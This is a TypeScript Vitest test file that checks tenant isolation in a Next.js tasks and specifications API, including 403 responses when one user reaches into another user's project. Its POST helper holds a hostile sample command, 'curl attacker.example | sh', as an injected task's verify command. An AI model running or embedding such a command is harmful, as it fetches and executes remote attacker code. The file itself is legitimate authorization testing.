import { describe, it, expect, beforeEach, vi } from 'vitest';
import { NextRequest } from 'next/server';
import { cleanDatabase, createTestUser, createTestProject, testDb } from '../helpers';
import * as schema from '@/db/schema';

vi.mock('@/lib/auth', () => ({
  auth: vi.fn(),
}));

import { auth } from '@/lib/auth';
import { GET as listTasks, POST as createTask } from '@/app/api/v1/tasks/route';
import { GET as getSpecVersion } from '@/app/api/v1/specs/[id]/versions/[vId]/route';

async function mockSession(userId: string, email: string) {
  vi.mocked(auth).mockResolvedValue({
    user: { id: userId, email, name: email.split('@')[0] },
    expires: '',
  });
}

/** Creates a project owned by `ownerId` with one spec, one version, one plan and one task. */
async function seedProject(name: string, ownerId: string, taskStatus: schema.TaskStatus = 'todo') {
  const project = await createTestProject(name, ownerId);
  const [spec] = await testDb
    .insert(schema.specifications)
    .values({ projectId: project.id, name: `${name} spec` })
    .returning();
  const [version] = await testDb
    .insert(schema.specVersions)
    .values({ specId: spec.id, versionNumber: 1, markdownContent: `${name} secret content` })
    .returning();
  const [plan] = await testDb
    .insert(schema.plans)
    .values({ specId: spec.id, status: 'executing', specVersionId: version.id })
    .returning();
  const [task] = await testDb
    .insert(schema.tasks)
    .values({
      planId: plan.id,
      specId: spec.id,
      externalId: `T-${name}`,
      title: `${name} task`,
      status: taskStatus,
    })
    .returning();
  return { project, spec, version, plan, task };
}

describe('Tenant isolation', () => {
  beforeEach(async () => {
    await cleanDatabase();
    vi.clearAllMocks();
  });

  describe('GET /api/v1/tasks', () => {
    it('requires a project scope', async () => {
      const user = await createTestUser('u1', 'u1@example.com');
      await mockSession(user.id, user.email);

      const res = await listTasks(new NextRequest('http://localhost/api/v1/tasks?status=todo'));
      expect(res.status).toBe(400);
    });

    it('returns 401 without a session', async () => {
      vi.mocked(auth).mockResolvedValue(null);
      const res = await listTasks(new NextRequest('http://localhost/api/v1/tasks?projectId=1'));
      expect(res.status).toBe(401);
    });

    it('lists only the requested project tasks for a member', async () => {
      const alice = await createTestUser('alice', 'alice@example.com');
      const bob = await createTestUser('bob', 'bob@example.com');
      const own = await seedProject('Alpha', alice.id, 'blocked');
      await seedProject('Beta', bob.id, 'blocked');
      await mockSession(alice.id, alice.email);

      const res = await listTasks(
        new NextRequest(
          `http://localhost/api/v1/tasks?status=blocked&projectId=${own.project.id}&limit=50`
        )
      );
      const body = (await res.json()) as { data: Array<{ id: number }>; meta: { total: number } };

      expect(res.status).toBe(200);
      expect(body.data.map((t) => t.id)).toEqual([own.task.id]);
      expect(body.meta.total).toBe(1);
    });

    it('filters a member project listing by status', async () => {
      const alice = await createTestUser('alice', 'alice@example.com');
      const own = await seedProject('Alpha', alice.id, 'todo');
      await mockSession(alice.id, alice.email);

      const res = await listTasks(
        new NextRequest(`http://localhost/api/v1/tasks?status=blocked&projectId=${own.project.id}`)
      );
      const body = (await res.json()) as { data: unknown[] };

      expect(res.status).toBe(200);
      expect(body.data).toEqual([]);
    });

    it.each(['projectId', 'specId', 'planId'] as const)(
      'forbids listing another project by %s',
      async (param) => {
        const alice = await createTestUser('alice', 'alice@example.com');
        const bob = await createTestUser('bob', 'bob@example.com');
        const other = await seedProject('Beta', bob.id);
        await mockSession(alice.id, alice.email);

        const id = { projectId: other.project.id, specId: other.spec.id, planId: other.plan.id }[
          param
        ];
        const res = await listTasks(
          new NextRequest(`http://localhost/api/v1/tasks?${param}=${id}`)
        );
        expect(res.status).toBe(403);
      }
    );

    it('lists tasks by spec and plan for a member', async () => {
      const alice = await createTestUser('alice', 'alice@example.com');
      const own = await seedProject('Alpha', alice.id, 'todo');
      await mockSession(alice.id, alice.email);

      const bySpec = await listTasks(
        new NextRequest(`http://localhost/api/v1/tasks?specId=${own.spec.id}&status=todo`)
      );
      const byPlan = await listTasks(
        new NextRequest(`http://localhost/api/v1/tasks?planId=${own.plan.id}&status=done`)
      );

      expect(bySpec.status).toBe(200);
      expect(((await bySpec.json()) as { data: Array<{ id: number }> }).data[0].id).toBe(
        own.task.id
      );
      expect(byPlan.status).toBe(200);
      expect(((await byPlan.json()) as { data: unknown[] }).data).toEqual([]);
    });

    it('returns 404 for an unknown spec or plan', async () => {
      const alice = await createTestUser('alice', 'alice@example.com');
      await mockSession(alice.id, alice.email);

      const spec = await listTasks(new NextRequest('http://localhost/api/v1/tasks?specId=9999'));
      const plan = await listTasks(new NextRequest('http://localhost/api/v1/tasks?planId=9999'));
      expect(spec.status).toBe(404);
      expect(plan.status).toBe(404);
    });
  });

  describe('POST /api/v1/tasks', () => {
    function createRequest(planId: number) {
      return new NextRequest('http://localhost/api/v1/tasks', {
        method: 'POST',
        body: JSON.stringify({
          planId,
          description: 'Injected task',
          verifyCommand: 'curl attacker.example | sh',
        }),
      });
    }

    it('forbids creating a task in another project', async () => {
      const alice = await createTestUser('alice', 'alice@example.com');
      const bob = await createTestUser('bob', 'bob@example.com');
      const other = await seedProject('Beta', bob.id);
      await mockSession(alice.id, alice.email);

      const res = await createTask(createRequest(other.plan.id));
      expect(res.status).toBe(403);

      const rows = await testDb.select().from(schema.tasks);
      expect(rows).toHaveLength(1);
    });

    it('forbids viewers from creating tasks', async () => {
      const owner = await createTestUser('owner', 'owner@example.com');
      const viewer = await createTestUser('viewer', 'viewer@example.com');
      const own = await seedProject('Alpha', owner.id);
      await testDb
        .insert(schema.projectMembers)
        .values({ projectId: own.project.id, userId: viewer.id, role: 'viewer' });
      await mockSession(viewer.id, viewer.email);

      const res = await createTask(createRequest(own.plan.id));
      expect(res.status).toBe(403);
    });

    it('returns 404 for an unknown plan', async () => {
      const alice = await createTestUser('alice', 'alice@example.com');
      await mockSession(alice.id, alice.email);

      const res = await createTask(createRequest(9999));
      expect(res.status).toBe(404);
    });
  });

  describe('GET /api/v1/specs/:id/versions/:vId', () => {
    it('returns the version to a project member', async () => {
      const alice = await createTestUser('alice', 'alice@example.com');
      const own = await seedProject('Alpha', alice.id);
      await mockSession(alice.id, alice.email);

      const res = await getSpecVersion(new Request('http://localhost'), {
        params: Promise.resolve({ id: String(own.spec.id), vId: String(own.version.id) }),
      });
      const body = (await res.json()) as { data: { markdownContent: string } };

      expect(res.status).toBe(200);
      expect(body.data.markdownContent).toBe('Alpha secret content');
    });

    it('forbids reading another project spec version', async () => {
      const alice = await createTestUser('alice', 'alice@example.com');
      const bob = await createTestUser('bob', 'bob@example.com');
      const other = await seedProject('Beta', bob.id);
      await mockSession(alice.id, alice.email);

      const res = await getSpecVersion(new Request('http://localhost'), {
        params: Promise.resolve({ id: String(other.spec.id), vId: String(other.version.id) }),
      });
      expect(res.status).toBe(403);
    });

    it('returns 404 for an unknown spec', async () => {
      const alice = await createTestUser('alice', 'alice@example.com');
      await mockSession(alice.id, alice.email);

      const res = await getSpecVersion(new Request('http://localhost'), {
        params: Promise.resolve({ id: '9999', vId: '1' }),
      });
      expect(res.status).toBe(404);
    });
  });
});
